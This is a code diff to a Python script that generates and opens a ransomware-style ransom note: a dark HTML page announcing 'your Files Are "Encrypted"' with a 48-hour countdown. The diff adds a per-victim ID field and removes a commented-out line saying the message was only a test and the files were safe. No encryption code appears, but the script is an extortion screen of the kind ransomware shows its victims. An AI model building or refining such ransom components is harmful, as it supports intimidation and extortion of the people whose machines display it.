@@ -1,15 +1,15 @@
 import os
 import webbrowser
 
-def create_message():
-    html_content = '''<!DOCTYPE html>
+def create_message(id):
+    html_content = f'''<!DOCTYPE html>
     <html lang="en">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Important Message</title>
         <style>
-            body {
+            body {{
                 background-color: #0b0c10;
                 color: red;
                 font-family: 'Courier New', Courier, monospace;
@@ -21,38 +21,38 @@ def create_message():
                 justify-content: center;
                 align-items: center;
                 flex-direction: column;
-            }
-            h1 {
+            }}
+            h1 {{
                 color: #e55039;
                 font-size: 2rem;
-            }
-            p {
+            }}
+            p {{
                 font-size: 1.2rem;
-            }
-            .timer {
+            }}
+            .timer {{
                 color: #e55039;
                 font-size: 1.5rem;
                 margin: 20px 0;
-            }
-            .contact {
+            }}
+            .contact {{
                 margin-top: 2rem;
-            }
-            .contact-info {
+            }}
+            .contact-info {{
                 background-color: #1d1e22;
                 padding: 1rem;
                 border-radius: 5px;
-            }
-            .note {
+            }}
+            .note {{
                 color: #aaa;
                 font-size: 0.8rem;
                 margin-top: 2rem;
-            }
+            }}
         </style>
     </head>
     <body>
         <div class="message">
             <h1>Ooops, your Files Are "Encrypted"</h1>
-            <!-- <p>Don't worry, this is just a test message. Your files are safe.</p> -->
+            <p>ID: {id}</p>
             <div id="timer" class="timer">
                 Time left: <span id="time">01:00:00</span>
             </div>
@@ -75,7 +75,7 @@ def create_message():
             countDownDate.setHours(countDownDate.getHours() + 48); // Set the countdown to 48 hours
 
             // Update the countdown every 1 second
-            var timer = setInterval(function() {
+            var timer = setInterval(function() {{
                 // Get today's date and time
                 var now = new Date().getTime();
                 
@@ -95,11 +95,11 @@ def create_message():
                     + (seconds < 10 ? "0" + seconds : seconds) + "s ";
                 
                 // If the countdown is over, write some text 
-                if (timeRemaining < 0) {
+                if (timeRemaining < 0) {{
                     clearInterval(timer);
                     document.getElementById("time").innerHTML = "EXPIRED";
-                }
-            }, 1000);
+                }}
+            }}, 1000);
         </script>
     </body>
     </html>
